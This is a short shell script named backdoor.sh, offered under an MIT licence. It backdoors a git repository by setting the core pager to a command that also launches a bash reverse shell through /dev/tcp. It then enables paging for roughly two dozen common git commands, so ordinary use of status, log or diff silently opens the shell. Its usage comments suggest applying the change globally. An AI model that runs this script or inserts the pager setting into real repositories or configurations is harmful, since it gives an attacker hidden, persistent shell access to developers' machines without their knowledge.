#!/bin/sh
#
# backdoor.sh - git repo backdoor
#
# Steps:
#   1. cd into the repo you want to backdoor. 
#   2. feel free to modify this script however you want. 
#      for extra fun, add `--global` to your config commands.
#   3. Run ./backdoor.sh
#
# MIT License
#
# Copyright (c) 2021 Dayton Hasty
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

REVSHELL="(/bin/bash -i >& /dev/tcp/127.0.0.1/8087 0>&1 &) 2> /dev/null"
PAGER_STR="less -FRX; ${REVSHELL}"

COMMANDS=(
    "init"
    "clone"
    "status"
    "add"
    "mv"
    "sparse-checkout"
    "bisect"
    "grep"
    "rebase"
    "tag"
    "fetch"
    "commit"
    "rm"
    "checkout"
    "revert"
    "reset"
    "branch"
    "push"
    "merge"
    "stash"
    "pull"
    "remote"
    "switch"
    "restore"
    "diff"
    "log"
)

git config core.pager "$PAGER_STR"
for CMD in "${COMMANDS[@]}"; do
    echo "Backdooring git $CMD..."
    git config pager.$CMD true
done
